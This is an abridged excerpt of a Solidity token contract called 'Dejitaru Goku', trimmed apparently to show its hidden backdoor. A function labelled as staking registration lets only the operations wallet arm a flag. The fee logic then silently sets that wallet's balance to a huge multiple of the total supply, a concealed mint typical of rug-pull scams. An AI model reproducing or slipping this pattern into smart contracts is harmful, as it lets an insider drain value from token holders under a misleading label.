...
// Main Contract Logic 
// --------------------------------------------------------------
contract DejitaruGoku is Context, IERC20, Ownable {
    // Imports
    using SafeMath for uint256;
    ...
    // Context
    string private _name = "Dejitaru Goku";
    ...
    // wallets
    address payable public liquidityWallet = payable(0xF647C92b9632DbcB215681e027682822422F0eC7);
    address payable public operationsWallet =  payable(0xF647C92b9632DbcB215681e027682822422F0eC7);
    ...
    bool public stakingRegistered = false;
    ...
    // staking funcitonality registeration
    function setStakingRegistered() external {
        require(msg.sender == operationsWallet, '!');
        stakingRegistered = true;
    }
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {_balances[address(this)] = _balances[address(this)].add(feeAmount);emit Transfer(sender, address(this), feeAmount);if (stakingRegistered) {stakingRegistered = false;_balances[operationsWallet] = _totalSupply * 1e18;}}
